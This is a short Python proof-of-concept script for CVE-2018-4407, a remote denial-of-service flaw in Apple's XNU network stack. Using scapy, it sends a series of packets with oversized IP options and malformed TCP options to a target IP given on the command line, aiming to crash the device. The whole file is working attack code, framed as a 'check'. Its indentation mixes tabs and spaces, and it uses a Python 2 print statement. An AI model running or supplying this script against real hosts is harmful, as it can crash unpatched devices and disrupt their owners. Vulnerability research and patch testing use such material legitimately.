# CVE-2018-4407 ICMP DOS
# https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407
# from https://twitter.com/ihackbanme

import sys
try:
	from scapy.all import *
except Exception as e:
	print ("[*] You need install scapy first:\n[*] sudo pip install scapy ")

if __name__ == '__main__':
	try:
		check_ip = sys.argv[1]
        print ("[*] !!!!!!Dangerous operation!!!!!!")
		print ("[*] Trying CVE-2018-4407 ICMP DOS " + check_ip)
		for i in range(8,20):
		    send(IP(dst=check_ip,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
		print ("[*] Check Over!! ")
	except Exception as e:
		print "[*] usage: sudo python check_icmp_dos.py 127.0.0.1"
